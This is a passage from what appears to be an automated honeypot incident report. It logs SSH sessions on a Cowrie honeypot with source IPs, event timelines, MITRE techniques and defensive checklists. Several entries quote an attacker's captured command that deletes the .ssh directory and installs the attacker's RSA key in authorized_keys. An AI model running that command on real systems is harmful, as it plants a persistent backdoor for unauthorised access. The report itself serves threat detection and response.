- [ ] Block `31.56.146[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea322e9f791e

| Field | Detail |
|---|---|
| **Source IP** | `31.56.146[.]239` |
| **First Seen** | 2026-09-03 07:58 |
| **Last Seen** | 2026-09-03 07:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:58:46` | `cowrie.session.connect` |
| `2026-09-03 07:58:46` | `cowrie.client.version` |
| `2026-09-03 07:58:46` | `cowrie.client.kex` |
| `2026-09-03 07:58:48` | `cowrie.login.success` |
| `2026-09-03 07:58:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.146[.]239` to AbuseIPDB if not already reported
- [ ] Block `31.56.146[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edcd33be6ddf

| Field | Detail |
|---|---|
| **Source IP** | `31.56.146[.]239` |
| **First Seen** | 2026-09-03 07:58 |
| **Last Seen** | 2026-09-03 07:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:58:49` | `cowrie.session.connect` |
| `2026-09-03 07:58:49` | `cowrie.client.version` |
| `2026-09-03 07:58:49` | `cowrie.client.kex` |
| `2026-09-03 07:58:50` | `cowrie.login.success` |
| `2026-09-03 07:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.146[.]239` to AbuseIPDB if not already reported
- [ ] Block `31.56.146[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27b0c4276c83

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:02 |
| **Last Seen** | 2026-09-03 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:02:31` | `cowrie.session.connect` |
| `2026-09-03 08:02:31` | `cowrie.client.version` |
| `2026-09-03 08:02:31` | `cowrie.client.kex` |
| `2026-09-03 08:02:32` | `cowrie.login.success` |
| `2026-09-03 08:02:32` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:02:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:02:32` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dadfe74348e1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:05 |
| **Last Seen** | 2026-09-03 08:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:05:30` | `cowrie.session.connect` |
| `2026-09-03 08:05:30` | `cowrie.client.version` |
| `2026-09-03 08:05:30` | `cowrie.client.kex` |
| `2026-09-03 08:05:31` | `cowrie.login.success` |
| `2026-09-03 08:05:31` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:05:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:05:31` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54133faa5b5d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.186[.]128` |
| **First Seen** | 2026-09-03 08:07 |
| **Last Seen** | 2026-09-03 08:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:07:52` | `cowrie.session.connect` |
| `2026-09-03 08:07:53` | `cowrie.login.success` |
| `2026-09-03 08:07:53` | `cowrie.session.params` |
| `2026-09-03 08:07:54` | `cowrie.command.input` |
| `2026-09-03 08:07:54` | `cowrie.command.input` |
| `2026-09-03 08:07:55` | `cowrie.command.input` |
| `2026-09-03 08:07:55` | `cowrie.command.input` |
| `2026-09-03 08:07:55` | `cowrie.command.failed` |
| `2026-09-03 08:07:56` | `cowrie.log.closed` |
| `2026-09-03 08:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.186[.]128` to AbuseIPDB if not already reported
- [ ] Block `209.99.186[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5395a89cfe0d

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]87` |
| **First Seen** | 2026-09-03 08:08 |
| **Last Seen** | 2026-09-03 08:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:08:06` | `cowrie.session.connect` |
| `2026-09-03 08:08:06` | `cowrie.client.version` |
| `2026-09-03 08:08:06` | `cowrie.client.kex` |
| `2026-09-03 08:08:06` | `cowrie.login.success` |
| `2026-09-03 08:08:07` | `cowrie.session.params` |
| `2026-09-03 08:08:07` | `cowrie.command.input` |
| `2026-09-03 08:08:07` | `cowrie.command.failed` |
| `2026-09-03 08:08:07` | `cowrie.log.closed` |
| `2026-09-03 08:08:08` | `cowrie.session.params` |
| `2026-09-03 08:08:08` | `cowrie.command.input` |
| `2026-09-03 08:08:08` | `cowrie.session.file_download` |
| `2026-09-03 08:08:08` | `cowrie.log.closed` |
| `2026-09-03 08:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]87` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c3e8f430d7e

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]87` |
| **First Seen** | 2026-09-03 08:08 |
| **Last Seen** | 2026-09-03 08:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:08:08` | `cowrie.session.connect` |
| `2026-09-03 08:08:08` | `cowrie.client.version` |
| `2026-09-03 08:08:09` | `cowrie.client.kex` |
| `2026-09-03 08:08:09` | `cowrie.login.success` |
| `2026-09-03 08:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]87` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df92018e2d88

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]87` |
| **First Seen** | 2026-09-03 08:08 |
| **Last Seen** | 2026-09-03 08:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:08:09` | `cowrie.session.connect` |
| `2026-09-03 08:08:09` | `cowrie.client.version` |
| `2026-09-03 08:08:09` | `cowrie.client.kex` |
| `2026-09-03 08:08:10` | `cowrie.login.success` |
| `2026-09-03 08:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]87` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-279d5b4914e7

| Field | Detail |
|---|---|
| **Source IP** | `175.118.127[.]138` |
| **First Seen** | 2026-09-03 08:09 |
| **Last Seen** | 2026-09-03 08:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:09:25` | `cowrie.session.connect` |
| `2026-09-03 08:09:25` | `cowrie.client.version` |
| `2026-09-03 08:09:25` | `cowrie.client.kex` |
| `2026-09-03 08:09:26` | `cowrie.login.success` |
| `2026-09-03 08:09:27` | `cowrie.session.params` |
| `2026-09-03 08:09:27` | `cowrie.command.input` |
| `2026-09-03 08:09:27` | `cowrie.command.failed` |
| `2026-09-03 08:09:28` | `cowrie.log.closed` |
| `2026-09-03 08:09:28` | `cowrie.session.params` |
| `2026-09-03 08:09:28` | `cowrie.command.input` |
| `2026-09-03 08:09:28` | `cowrie.session.file_download` |
| `2026-09-03 08:09:28` | `cowrie.log.closed` |
| `2026-09-03 08:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.118.127[.]138` to AbuseIPDB if not already reported
- [ ] Block `175.118.127[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-387625d4cf18

| Field | Detail |
|---|---|
| **Source IP** | `175.118.127[.]138` |
| **First Seen** | 2026-09-03 08:09 |
| **Last Seen** | 2026-09-03 08:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:09:29` | `cowrie.session.connect` |
| `2026-09-03 08:09:29` | `cowrie.client.version` |
| `2026-09-03 08:09:29` | `cowrie.client.kex` |
| `2026-09-03 08:09:30` | `cowrie.login.success` |
| `2026-09-03 08:09:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.118.127[.]138` to AbuseIPDB if not already reported
- [ ] Block `175.118.127[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97c7cd6f9c3f

| Field | Detail |
|---|---|
| **Source IP** | `175.118.127[.]138` |
| **First Seen** | 2026-09-03 08:09 |
| **Last Seen** | 2026-09-03 08:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:09:30` | `cowrie.session.connect` |
| `2026-09-03 08:09:30` | `cowrie.client.version` |
| `2026-09-03 08:09:30` | `cowrie.client.kex` |
| `2026-09-03 08:09:31` | `cowrie.login.success` |
| `2026-09-03 08:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.118.127[.]138` to AbuseIPDB if not already reported
- [ ] Block `175.118.127[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c71d038ba03e

| Field | Detail |
|---|---|
| **Source IP** | `79.101.53[.]18` |
| **First Seen** | 2026-09-03 08:10 |
| **Last Seen** | 2026-09-03 08:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:10:27` | `cowrie.session.connect` |
| `2026-09-03 08:10:27` | `cowrie.client.version` |
| `2026-09-03 08:10:27` | `cowrie.client.kex` |
| `2026-09-03 08:10:28` | `cowrie.login.success` |
| `2026-09-03 08:10:29` | `cowrie.session.params` |
| `2026-09-03 08:10:29` | `cowrie.command.input` |
| `2026-09-03 08:10:29` | `cowrie.command.failed` |
| `2026-09-03 08:10:29` | `cowrie.log.closed` |
| `2026-09-03 08:10:30` | `cowrie.session.params` |
| `2026-09-03 08:10:30` | `cowrie.command.input` |
| `2026-09-03 08:10:30` | `cowrie.session.file_download` |
| `2026-09-03 08:10:30` | `cowrie.log.closed` |
| `2026-09-03 08:10:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.101.53[.]18` to AbuseIPDB if not already reported
- [ ] Block `79.101.53[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a11e080b6231

| Field | Detail |
|---|---|
| **Source IP** | `79.101.53[.]18` |
| **First Seen** | 2026-09-03 08:10 |
| **Last Seen** | 2026-09-03 08:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:10:30` | `cowrie.session.connect` |
| `2026-09-03 08:10:30` | `cowrie.client.version` |
| `2026-09-03 08:10:30` | `cowrie.client.kex` |
| `2026-09-03 08:10:31` | `cowrie.login.success` |
| `2026-09-03 08:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.101.53[.]18` to AbuseIPDB if not already reported
- [ ] Block `79.101.53[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-922db53e33f0

| Field | Detail |
|---|---|
| **Source IP** | `79.101.53[.]18` |
| **First Seen** | 2026-09-03 08:10 |
| **Last Seen** | 2026-09-03 08:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:10:31` | `cowrie.session.connect` |
| `2026-09-03 08:10:31` | `cowrie.client.version` |
| `2026-09-03 08:10:31` | `cowrie.client.kex` |
| `2026-09-03 08:10:31` | `cowrie.login.success` |
| `2026-09-03 08:10:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.101.53[.]18` to AbuseIPDB if not already reported
- [ ] Block `79.101.53[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e092e54165a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:11 |
| **Last Seen** | 2026-09-03 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:11:55` | `cowrie.session.connect` |
| `2026-09-03 08:11:55` | `cowrie.client.version` |
| `2026-09-03 08:11:55` | `cowrie.client.kex` |
| `2026-09-03 08:11:56` | `cowrie.login.success` |
| `2026-09-03 08:11:56` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:11:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:11:56` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:11:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b170d98abeb3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 08:13 |
| **Last Seen** | 2026-09-03 08:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:13:16` | `cowrie.session.connect` |
| `2026-09-03 08:13:16` | `cowrie.client.version` |
| `2026-09-03 08:13:16` | `cowrie.client.kex` |
| `2026-09-03 08:13:16` | `cowrie.login.success` |
| `2026-09-03 08:13:17` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:13:17` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8e6cfb0588

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:16 |
| **Last Seen** | 2026-09-03 08:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:16:20` | `cowrie.session.connect` |
| `2026-09-03 08:16:20` | `cowrie.client.version` |
| `2026-09-03 08:16:20` | `cowrie.client.kex` |
| `2026-09-03 08:16:21` | `cowrie.login.success` |
| `2026-09-03 08:16:21` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:16:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:16:21` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf59f6659173

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:21 |
| **Last Seen** | 2026-09-03 08:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:21:35` | `cowrie.session.connect` |
| `2026-09-03 08:21:35` | `cowrie.client.version` |
| `2026-09-03 08:21:35` | `cowrie.client.kex` |
| `2026-09-03 08:21:36` | `cowrie.login.success` |
| `2026-09-03 08:21:36` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:21:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:21:37` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59cae5fed07c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:27 |
| **Last Seen** | 2026-09-03 08:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:27:13` | `cowrie.session.connect` |
| `2026-09-03 08:27:13` | `cowrie.client.version` |
| `2026-09-03 08:27:13` | `cowrie.client.kex` |
| `2026-09-03 08:27:14` | `cowrie.login.success` |
| `2026-09-03 08:27:14` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:27:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:27:15` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-108c3b22f9a4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:31 |
| **Last Seen** | 2026-09-03 08:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:31:10` | `cowrie.session.connect` |
| `2026-09-03 08:31:10` | `cowrie.client.version` |
| `2026-09-03 08:31:10` | `cowrie.client.kex` |
| `2026-09-03 08:31:11` | `cowrie.login.success` |
| `2026-09-03 08:31:12` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:31:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:31:12` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2065a8a2e213

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:37 |
| **Last Seen** | 2026-09-03 08:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:37:47` | `cowrie.session.connect` |
| `2026-09-03 08:37:47` | `cowrie.client.version` |
| `2026-09-03 08:37:47` | `cowrie.client.kex` |
| `2026-09-03 08:37:48` | `cowrie.login.success` |
| `2026-09-03 08:37:48` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:37:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:37:48` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:37:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba7f18e47b38

| Field | Detail |
|---|---|
| **Source IP** | `34.53.161[.]246` |
| **First Seen** | 2026-09-03 08:38 |
| **Last Seen** | 2026-09-03 08:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:38:33` | `cowrie.session.connect` |
| `2026-09-03 08:38:33` | `cowrie.login.success` |
| `2026-09-03 08:38:34` | `cowrie.session.params` |
| `2026-09-03 08:38:34` | `cowrie.command.input` |
| `2026-09-03 08:38:34` | `cowrie.command.input` |
| `2026-09-03 08:38:34` | `cowrie.command.failed` |
| `2026-09-03 08:38:34` | `cowrie.command.input` |
| `2026-09-03 08:38:34` | `cowrie.log.closed` |
| `2026-09-03 08:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.161[.]246` to AbuseIPDB if not already reported
- [ ] Block `34.53.161[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38307ee63be4

| Field | Detail |
|---|---|
| **Source IP** | `34.53.161[.]246` |
| **First Seen** | 2026-09-03 08:38 |
| **Last Seen** | 2026-09-03 08:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
